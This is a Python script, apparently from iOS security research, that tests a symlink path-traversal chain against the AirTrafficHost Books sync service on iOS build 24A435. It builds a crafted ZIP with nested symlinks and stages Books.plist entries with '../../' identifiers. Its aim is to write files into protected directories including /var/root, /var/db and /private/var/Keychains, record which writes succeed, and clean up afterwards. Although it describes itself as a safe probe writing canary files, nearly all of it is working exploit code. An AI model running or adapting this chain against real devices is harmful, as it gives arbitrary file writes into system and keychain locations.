#!/usr/bin/env python3
"""Safely test a two-symlink ATC path-resolution chain on iOS 24A435.

Every destination is a fresh randomized leaf.  The second pivot is recovered
from PromiseStaging before local cleanup; if that recovery cannot be proved,
the outer Media pivot is deliberately preserved for a later recovery attempt.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Any


EXPECTED_PRODUCT = "iPhone18,2"
EXPECTED_VERSION = "27.0"
EXPECTED_BUILD = "24A435"
AIRLOCK_BOOK_ROOT = "/var/mobile/Media/Airlock/Book"
MEDIA_ROOT = "/var/mobile/Media"
PROMISE_DIRECTORY = (
    "/var/containers/Shared/SystemGroup/"
    "systemgroup.com.apple.installcoordinationd/Library/"
    "InstallCoordination/PromiseStaging"
)
TARGETS = (
    ("control-mobile-caches", "/var/mobile/Library/Caches"),
    (
        "mobilegestalt-system-group-caches",
        "/var/containers/Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache/Library/Caches",
    ),
    ("var-db", "/var/db"),
    ("var-root", "/var/root"),
    ("system-data-containers", "/var/containers/Data/System"),
    ("library-preferences", "/Library/Preferences"),
    ("private-var-keychains", "/private/var/Keychains"),
)
SZ_EXTRA_ID = 0x5A53  # local-header bytes "SZ", consumed by StreamingZip
ROOT = Path(__file__).resolve().parent
ATC_SEQUENCE = ROOT / "atc_sequence"
MOBILEDEVICE_IO = ROOT / "mobiledevice_io"


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 13, 18, 30, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def safe_tail(path: str) -> str:
    if not path.startswith("/") or path == "/":
        raise ValueError("target must be a non-root absolute path")
    tail = path[1:].rstrip("/")
    if any(component in ("", ".", "..") for component in tail.split("/")):
        raise ValueError("unsafe path component")
    return tail


def add_directories(archive: zipfile.ZipFile, tail: str, seen: set[str]) -> None:
    cursor = ""
    for component in tail.split("/"):
        cursor = f"{cursor}{component}/"
        if cursor in seen:
            continue
        archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        seen.add(cursor)


def build_archive(target_directory: str, pivot_leaf: str, payload: bytes) -> tuple[bytes, str, str]:
    promise_tail = safe_tail(PROMISE_DIRECTORY)
    target_tail = safe_tail(target_directory)
    promise_depth = len(promise_tail.split("/"))
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    seen: set[str] = set()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{promise_tail}".encode(),
        )
        add_directories(archive, promise_tail, seen)
        archive.writestr(
            zip_info(f"{promise_tail}/{pivot_leaf}", stat.S_IFLNK | 0o777),
            (("../" * promise_depth) + target_tail).encode(),
        )
        add_directories(archive, target_tail, seen)
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue(), promise_tail, target_tail


def build_books(identifiers: list[str]) -> bytes:
    books = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps(
        {"Books": books}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )


def run_json(command: list[str], timeout: int) -> dict[str, Any]:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    parsed: dict[str, Any] | None = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            parsed = value
            break
    if parsed is None:
        parsed = {"ok": False, "error": "no parseable helper output"}
    parsed["exitCode"] = completed.returncode
    if completed.stderr:
        parsed["stderrTail"] = completed.stderr.splitlines()[-6:]
    return parsed


def mobile(udid: str, command: str, *arguments: str) -> dict[str, Any]:
    return run_json(
        [os.fspath(MOBILEDEVICE_IO), command, udid, *arguments], timeout=60
    )


def atc(udid: str, pairs: list[tuple[str, str]]) -> dict[str, Any]:
    command = [os.fspath(ATC_SEQUENCE), udid]
    for identifier, destination in pairs:
        command.extend([identifier, destination])
    return run_json(command, timeout=180)


def operation_ok(result: dict[str, Any]) -> bool:
    return bool(result.get("targetGatePassed") and result.get("operation", {}).get("ok"))


def cleanup_state(operation: dict[str, Any]) -> dict[str, Any]:
    return {
        key: operation.get(key)
        for key in (
            "safeArguments",
            "recoveredPresent",
            "recoveredBytesMatch",
            "cleanupFailureCount",
            "sourceMediaAbsent",
            "linkAbsent",
            "recoveredAbsent",
            "booksFilesAbsent",
        )
    }


def run_target(udid: str, label: str, target_directory: str) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"codex-dir-src-24A435-{token}"
    outer_link = f"codex-dir-link-24A435-{token}"
    pivot_leaf = f"codex-dir-pivot-24A435-{token}"
    recovered_payload = f"codex-dir-recovered-24A435-payload-{token}"
    recovered_pivot = f"codex-dir-recovered-24A435-pivot-{token}"
    target_leaf = f"com.codex.nested-canary-{secrets.token_hex(16)}.bin"
    payload = (
        f"codex iOS nested-symlink canary\nbuild=24A435\nlabel={label}\n"
        f"nonce={secrets.token_hex(24)}\n"
    ).encode()
    archive, promise_tail, target_tail = build_archive(
        target_directory, pivot_leaf, payload
    )

    outer_identifier = f"../../{source}/p0/p1/p2/link"
    pivot_identifier = f"../../{source}/{promise_tail}/{pivot_leaf}"
    payload_identifier = f"../../{source}/payload"
    target_path = f"{target_directory.rstrip('/')}/{target_leaf}"
    target_identifier = posixpath.relpath(target_path, AIRLOCK_BOOK_ROOT)
    pivot_through_outer_path = f"{MEDIA_ROOT}/{outer_link}/{pivot_leaf}"
    pivot_through_outer_identifier = posixpath.relpath(
        pivot_through_outer_path, AIRLOCK_BOOK_ROOT
    )
    identifiers = [
        outer_identifier,
        pivot_identifier,
        payload_identifier,
        target_identifier,
        pivot_through_outer_identifier,
    ]
    books = build_books(identifiers)

    result: dict[str, Any] = {
        "label": label,
        "targetDirectory": target_directory,
        "targetLeaf": target_leaf,
        "source": source,
        "outerLink": outer_link,
        "pivotLeaf": pivot_leaf,
        "recoveredPayload": recovered_payload,
        "recoveredPivot": recovered_pivot,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksSHA256": hashlib.sha256(books).hexdigest(),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
    }

    with tempfile.TemporaryDirectory(prefix="atc-nested-ios-") as work_directory:
        work = Path(work_directory)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        recovery_books_path = work / "RecoveryBooks.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(archive)
        books_path.write_bytes(books)
        expected_path.write_bytes(payload)

        result["preflight"] = mobile(udid, "probe-afc")
        if not operation_ok(result["preflight"]) or result["preflight"]["operation"].get(
            "booksSyncPlistPresent"
        ):
            result["outcome"] = "preflight-failed"
            return result

        result["stage"] = mobile(
            udid,
            "stage",
            source,
            outer_link,
            recovered_payload,
            os.fspath(archive_path),
            os.fspath(books_path),
        )
        if not operation_ok(result["stage"]):
            result["outcome"] = "stage-failed"
        else:
            result["atc"] = atc(
                udid,
                [
                    (outer_identifier, outer_link),
                    (pivot_identifier, f"{outer_link}/{pivot_leaf}"),
                    (payload_identifier, f"{outer_link}/{pivot_leaf}/{target_leaf}"),
                    (target_identifier, recovered_payload),
                    (pivot_through_outer_identifier, recovered_pivot),
                ],
            )
            result["postSequence"] = mobile(
                udid,
                "probe-nested-state",
                source,
                outer_link,
                recovered_payload,
                recovered_pivot,
                pivot_leaf,
            )

            post = result["postSequence"].get("operation", {})
            if not post.get("recoveredPivotPresent"):
                recovery_books = build_books([pivot_through_outer_identifier])
                recovery_books_path.write_bytes(recovery_books)
                result["recoveryStage"] = mobile(
                    udid,
                    "stage-nested-recovery-books",
                    source,
                    outer_link,
                    recovered_pivot,
                    os.fspath(recovery_books_path),
                    pivot_leaf,
                )
                if operation_ok(result["recoveryStage"]):
                    result["recoveryATC"] = atc(
                        udid,
                        [(pivot_through_outer_identifier, recovered_pivot)],
                    )
                    result["postRecovery"] = mobile(
                        udid,
                        "probe-nested-state",
                        source,
                        outer_link,
                        recovered_payload,
                        recovered_pivot,
                        pivot_leaf,
                    )
                    post = result["postRecovery"].get("operation", {})

            if not post.get("recoveredPivotPresent"):
                result["outcome"] = "pivot-recovery-unproved-cleanup-preserved"
                result["residueAccountedFor"] = False
                return result

            result["cleanupPromiseBranch"] = mobile(
                udid,
                "verify-matrix-cleanup",
                source,
                outer_link,
                recovered_payload,
                os.fspath(expected_path),
                f"{promise_tail}/{pivot_leaf}",
            )
            result["cleanupTargetBranch"] = mobile(
                udid,
                "verify-matrix-cleanup",
                source,
                outer_link,
                recovered_pivot,
                os.fspath(expected_path),
                target_tail,
            )
            result["finalPreflight"] = mobile(udid, "probe-afc")

            first = result["cleanupPromiseBranch"].get("operation", {})
            second = result["cleanupTargetBranch"].get("operation", {})
            result["writeAndExactRecoveryConfirmed"] = bool(
                first.get("recoveredPresent") and first.get("recoveredBytesMatch")
            )
            result["cleanup"] = {
                "promiseBranch": cleanup_state(first),
                "targetBranch": cleanup_state(second),
            }
            result["residueAccountedFor"] = bool(
                second.get("safeArguments")
                and second.get("sourceMediaAbsent")
                and second.get("linkAbsent")
                and second.get("recoveredAbsent")
                and second.get("booksFilesAbsent")
                and not result["finalPreflight"].get("operation", {}).get(
                    "booksSyncPlistPresent"
                )
            )
            result["outcome"] = (
                "write-and-exact-recovery-confirmed"
                if result["writeAndExactRecoveryConfirmed"]
                else "no-write-observed"
            )
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--udid", required=True)
    parser.add_argument("--label", action="append")
    arguments = parser.parse_args()
    selected = set(arguments.label or [label for label, _ in TARGETS])
    unknown = selected.difference(label for label, _ in TARGETS)
    if unknown:
        parser.error(f"unknown labels: {', '.join(sorted(unknown))}")

    summary: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipNestedSymlinkIOSDirectoryProbe",
        "expectedProduct": EXPECTED_PRODUCT,
        "expectedVersion": EXPECTED_VERSION,
        "expectedBuild": EXPECTED_BUILD,
        "transport": "paired localNetwork via native MobileDevice/AirTrafficHost",
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
        "targets": [],
    }
    for index, (label, directory) in enumerate(TARGETS, 1):
        if label not in selected:
            continue
        row = run_target(arguments.udid, label, directory)
        summary["targets"].append(row)
        print(
            json.dumps(
                {
                    "progress": f"{index}/{len(TARGETS)}",
                    "label": label,
                    "targetDirectory": directory,
                    "outcome": row.get("outcome"),
                    "residueAccountedFor": row.get("residueAccountedFor"),
                },
                sort_keys=True,
            ),
            flush=True,
        )
        if not row.get("residueAccountedFor"):
            summary["abortedAfter"] = label
            break

    summary["confirmedWriteDirectories"] = [
        row["targetDirectory"]
        for row in summary["targets"]
        if row.get("writeAndExactRecoveryConfirmed")
    ]
    summary["noWriteObservedDirectories"] = [
        row["targetDirectory"]
        for row in summary["targets"]
        if row.get("outcome") == "no-write-observed"
    ]
    summary["allGeneratedArtifactsAccountedFor"] = bool(
        summary["targets"]
        and all(row.get("residueAccountedFor") for row in summary["targets"])
        and "abortedAfter" not in summary
    )
    summary["ok"] = summary["allGeneratedArtifactsAccountedFor"]
    print(json.dumps(summary, sort_keys=True))
    return 0 if summary["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
